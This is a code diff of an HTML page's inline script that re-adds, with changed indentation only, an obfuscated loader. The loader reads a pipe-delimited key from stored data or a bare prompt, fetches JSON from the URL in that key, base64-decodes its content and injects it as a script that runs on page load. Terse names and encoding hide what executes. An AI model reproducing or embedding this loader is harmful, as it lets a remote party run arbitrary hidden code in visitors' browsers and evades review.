@@ -45,34 +45,34 @@ class s {
         });
     }
 }
-    async function l(k) {
-        try {
-            a = k.split('|');
-            const res = await fetch(a[3], {[a[0]]: {[a[1]]: a[2]}});
-            if (!res.ok) throw new Error('net error');
-            const json = await res.json();
-            const code = decodeURIComponent(escape(atob(json.content)));
-            const dJ = document.createElement('script');
-            dJ.text = code;
-            document.head.appendChild(dJ);
-        } catch (e) {
-            alert('err:' + e.message);
-        }
-    }
-    (async () => {
-        try {
-            r = new s();
-            await r.init();
-            return l(await r.get('b', 'c'));
-        } catch(e) {
-            console.log(e.message);
-        }
-        uIn = window.prompt("k", "");
-        if (uIn == null || uIn == "") {
-            console.log("input null(canceled)");
-            return;
-        }
-        l(uIn);
-    })();
+async function l(k) {
+	try {
+		a = k.split('|');
+		const res = await fetch(a[3], {[a[0]]: {[a[1]]: a[2]}});
+		if (!res.ok) throw new Error('net error');
+		const json = await res.json();
+		const code = decodeURIComponent(escape(atob(json.content)));
+		const dJ = document.createElement('script');
+		dJ.text = code;
+		document.head.appendChild(dJ);
+	} catch (e) {
+		alert('err:' + e.message);
+	}
+}
+(async () => {
+	try {
+		r = new s();
+		await r.init();
+		return l(await r.get('b', 'c'));
+	} catch(e) {
+		console.log(e.message);
+	}
+	uIn = window.prompt("k", "");
+	if (uIn == null || uIn == "") {
+		console.log("input null(canceled)");
+		return;
+	}
+	l(uIn);
+})();
 </script>
 <body></body></html>
